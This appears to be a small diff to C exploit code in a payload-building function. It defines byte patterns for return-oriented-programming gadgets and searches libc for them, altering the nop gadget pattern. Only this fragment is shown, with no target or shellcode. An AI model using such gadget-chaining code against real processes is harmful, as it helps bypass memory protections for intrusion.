@@ -18,7 +18,7 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 	char s_popRDI[]	= {0x5f, 0xc3, 0};
 	char s_popRSI[]	= {0x5e, 0xc3, 0};
 	char s_popRDX[]	= {0x5a, 0xc3, 0};
-	char s_nopNOP[]	= {0x90, 0xc3, 0};
+	char s_nopNOP[]	= {0x90, 0x90, 0xc3, 0};
 
 	// First try to find gadgets in libc
 	Pointer	libc_popRDI = searchRegion(bap->regions + rt_libc, s_popRDI);
